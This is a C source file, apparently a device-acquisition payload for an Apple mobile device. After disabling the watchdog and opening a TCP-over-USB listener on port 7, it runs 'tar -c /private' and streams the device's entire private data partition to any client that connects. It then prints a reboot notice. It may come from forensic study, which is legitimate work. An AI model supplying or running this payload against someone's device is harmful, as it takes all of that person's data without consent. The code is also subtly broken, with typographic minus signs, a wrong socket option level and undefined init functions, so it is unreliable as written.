#define MAC_OS_X_VERSION_MIN_REQUIRED MAC_OS_X_VERSION_10_5


#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h> 
#include <sys/stat.h> 
#include <sys/socket.h>
#include <net/if.h> 
#include <netinet/tcp.h>
#include <netinet/in.h>


void disable_watchdog ( ); 
void init_tcp ( );
void init_usb ( );


int send_pipe(int wfd, const char *pipe) 
{
   size_t nr, nw, br, bsize;
   static unsigned char buf[4096];
   struct stat sbuf;
   unsigned long long tb = 0; off_t off;
   FILE *file;
   int fd;
   struct timeval tv;
   printf("creating pipe %s...\n", pipe);
   file = popen(pipe, "r");
   if (!file) 
   {
      printf("ERROR: unable to invoke '%s': %s\n", pipe, strerror(errno));
      goto FAIL; 
   }
   fd = fileno(file);
   while ((nr = read(fd, &buf, sizeof(buf))) > 0) 
   {
      if (!nr) 
      { 
         tv.tv_sec = 0;
         tv.tv_usec = 10000;
         select(0, NULL, NULL, NULL, &tv); continue;
      }
      for (off = 0; nr; nr -= nw, off += nw) 
      {
         if ((nw = write(wfd, buf + off, (size_t)nr)) < 0)
         {
            printf("ERROR: write() to socket failed\n"); goto FAIL;
         } 
         else
         {
            tb += nw; 
         }
      } 
   }
   printf("transmitted %llu bytes\n", tb);
   pclose(file); 
   return 0;
   
FAIL: sleep(10);
   if (file) 
      pclose(file);
   return −1;
}



int send_data(int wfd) 
{
   int r;
   printf("sending contents of /private...\n"); r = send_pipe(wfd, "/bin/tar -c /private"); if (r) return r;
   printf("transfer complete.\n");
   return 0; 
}


int socket_listen(void) 
{
   struct sockaddr_in local_addr, remote_addr; fd_set master, read_fds;
   int listener, fdmax, yes = 1, i;
   struct timeval tv;
   int port = 7;
   int do_listen = 1;
   int ret;
   FD_ZERO(&master); FD_ZERO(&read_fds);
   listener = socket(AF_INET, SOCK_STREAM, 0);
   setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));
   memset(&local_addr, 0, sizeof(struct sockaddr_in)); local_addr.sin_family = AF_INET; local_addr.sin_port = htons(port); local_addr.sin_addr.s_addr = INADDR_ANY;
   i = bind(listener, (struct sockaddr *)&local_addr, sizeof(struct sockaddr)); if (i) {
      printf("ERROR: bind() returned %d: %s\n", i, strerror(errno));
      return i; }
   i = listen(listener, 8); if (i) {
      printf("ERROR: listen() returned %d: %s\n", i, strerror(errno));
      return i; }
   FD_SET(listener, &master); fdmax = listener;
   printf("daemon now listening on TCP:%d.\n", port);
   while(do_listen) {
      read_fds = master;
      tv.tv_sec = 2; tv.tv_usec = 0;
      if (select(fdmax+1, &read_fds, NULL, NULL, &tv)>0) { for(i=0; i<=fdmax; i++) {
         if (FD_ISSET(i, &read_fds)) { if (i == listener) {
            int newfd;
            int addrlen = sizeof(remote_addr);
            if ((newfd = accept(listener, (struct sockaddr *)&remote_addr, (socklen_t *)&addrlen)) == −1)
            {
               continue; }
            setsockopt(newfd, SOL_SOCKET, TCP_NODELAY, &yes, sizeof(int));
            setsockopt(newfd, SOL_SOCKET, SO_NOSIGPIPE, &yes,
                       sizeof(int));
            ret = send_data(newfd);
            close(newfd); if (!ret)
               do_listen = 0;
         }
         } /* if FD_ISSET ... */
      } /* for(i=0; i<=fdmax; i++) */ } /* if (select(fdmax+1, ... */
   } /* for(;;) */
   printf("rebooting device in 10 seconds.\n"); sleep(10);
   return 0;
}


int main(int argc, char* argv[])
{
   printf("payload compiled " __DATE__ " " __TIME__ "\n");
   disable_watchdog(); printf("watchdog disabled.\n");
   init_tcp();
   init_usb();
   printf("usbmux initialized\n");
   return socket_listen(); 
}


